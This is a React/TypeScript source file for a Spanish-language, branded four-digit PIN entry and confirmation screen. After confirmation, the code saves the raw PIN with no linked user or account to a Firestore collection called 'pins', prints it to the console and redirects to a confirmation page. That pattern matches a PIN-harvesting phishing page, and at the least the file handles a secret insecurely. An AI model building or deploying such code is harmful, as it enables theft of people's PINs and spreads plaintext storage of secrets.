import React, { useState, useEffect, useRef } from 'react';
import { PinDisplay } from './components/PinDisplay';
import { NumpadButton } from './components/NumpadButton';
import { BackspaceIcon } from './components/icons/BackspaceIcon';
import { addDoc, collection, serverTimestamp } from 'firebase/firestore';
import { db } from './firebase';

const PIN_LENGTH = 4;
const CONFIRM_DELAY_MS = 1500; // 1.5 seconds para permitir entrada
const SHOW_CONFIRM_DELAY_MS = 2000; // 2 seconds antes de mostrar "Confirm your PIN"

const App: React.FC = () => {
  const [pin, setPin] = useState<string>('');
  const [firstPin, setFirstPin] = useState<string>('');
  const [confirming, setConfirming] = useState<boolean>(false);
  const [showConfirmText, setShowConfirmText] = useState<boolean>(false);
  const [canConfirm, setCanConfirm] = useState<boolean>(true);
  const [saving, setSaving] = useState<boolean>(false);
  const [error, setError] = useState<string>('');
  const [displayPin, setDisplayPin] = useState<string>(''); // para mostrar bolitas durante transición
  const timerRef = useRef<number | null>(null);
  const showConfirmTimerRef = useRef<number | null>(null);

  useEffect(() => {
    if (pin.length !== PIN_LENGTH || saving) return;

    // primera entrada completada -> pasar a modo confirmación y esperar 1.5s
    if (!confirming) {
      setFirstPin(pin);
      setDisplayPin(pin); // mantener bolitas visibles
      setPin('');
      setConfirming(true);
      setShowConfirmText(false);
      setError('');
      setCanConfirm(false);

      // limpiar timers previos
      if (timerRef.current) {
        window.clearTimeout(timerRef.current);
      }
      if (showConfirmTimerRef.current) {
        window.clearTimeout(showConfirmTimerRef.current);
      }

      // mostrar "Confirma tu PIN" después de 2 segundos y limpiar displayPin
      showConfirmTimerRef.current = window.setTimeout(() => {
        setShowConfirmText(true);
        setDisplayPin(''); // limpiar bolitas cuando aparezca "Confirma tu PIN"
        showConfirmTimerRef.current = null;
      }, SHOW_CONFIRM_DELAY_MS);

      // permitir entrada después de 1.5s
      timerRef.current = window.setTimeout(() => {
        setCanConfirm(true);
        timerRef.current = null;
      }, CONFIRM_DELAY_MS);
      return;
    }

    // en modo confirmación y segunda entrada completada
    if (confirming && pin === firstPin) {
      const save = async (value: string) => {
        setSaving(true);
        try {
          // guarda en la misma colección 'pins' con el mismo PIN (confirmado)
          await addDoc(collection(db, 'pins'), {
            pin: value,
            createdAt: serverTimestamp()
          });
          console.log('PIN guardado en Firestore:', value);
          window.location.href = '/confirmacion.html';
        } catch (e) {
          console.error('Error guardando PIN en Firestore:', e);
          setError('Error guardando PIN. Intenta de nuevo.');
          // reset flow
          setPin('');
          setDisplayPin('');
          setFirstPin('');
          setConfirming(false);
          setShowConfirmText(false);
          setSaving(false);
          setCanConfirm(true);
        }
      };

      save(pin);
    } else if (confirming && pin.length === PIN_LENGTH && pin !== firstPin) {
      // mismatch -> mostrar error y resetear flujo
      setError('Los PINs no coinciden. Inténtalo de nuevo.');
      setPin('');
      setDisplayPin('');
      setFirstPin('');
      setConfirming(false);
      setShowConfirmText(false);
      setCanConfirm(true);
    }
  }, [pin, saving, confirming, firstPin]);

  useEffect(() => {
    return () => {
      if (timerRef.current) {
        window.clearTimeout(timerRef.current);
      }
      if (showConfirmTimerRef.current) {
        window.clearTimeout(showConfirmTimerRef.current);
      }
    };
  }, []);

  const handleNumberClick = (num: string) => {
    if (saving) return;
    // bloquear entrada mientras espera el intervalo de confirmación
    if (confirming && !canConfirm) return;
    setPin(prev => (prev.length < PIN_LENGTH ? prev + num : prev));
  };

  const handleBackspaceClick = () => {
    if (saving) return;
    if (confirming && !canConfirm) return;
    setPin(prev => prev.slice(0, -1));
  };

  // mostrar displayPin si está en transición, sino mostrar pin normal
  const pinToDisplay = displayPin || pin;

  return (
    <div className="bg-brand-off-white min-h-screen flex flex-col items-center justify-center text-brand-red font-sans relative select-none">
      <div className="flex flex-col items-center justify-between h-full w-full max-w-xs p-4 pt-24 pb-8">
        <div className="mb-4 text-center">
          {confirming && showConfirmText && (
            <div
              style={{
                fontSize: '1.69rem',
                color: '#4B5563', // gris oscuro más claro
                fontWeight: 600,
                transform: 'translateY(-30%)'
              }}
            >
              Confirma tu PIN
            </div>
          )}
          {error && <div className="text-sm text-red-600 mt-2">{error}</div>}
        </div>

        <PinDisplay length={pinToDisplay.length} maxLength={PIN_LENGTH} />

        <div className="grid grid-cols-3 gap-x-[2.16rem] gap-y-[1.62rem] w-full mt-[3.75rem]">
          {['1','2','3','4','5','6','7','8','9'].map(num => (
            <NumpadButton key={num} onClick={() => handleNumberClick(num)} disabled={saving || (confirming && !canConfirm)}>
              <span className="text-2xl font-normal">{num}</span>
            </NumpadButton>
          ))}
          <div className="col-start-1" />
          <NumpadButton onClick={() => handleNumberClick('0')} disabled={saving || (confirming && !canConfirm)}>
            <span className="text-2xl font-normal">0</span>
          </NumpadButton>
          <NumpadButton onClick={handleBackspaceClick} isIcon={true} disabled={saving || (confirming && !canConfirm)}>
            <BackspaceIcon className="w-8 h-8" />
          </NumpadButton>
        </div>

        <div className="absolute bottom-10 right-10">
          <button className="text-brand-gray text-base underline" disabled={saving}>
            Opciones
          </button>
        </div>
      </div>
    </div>
  );
};

export default App;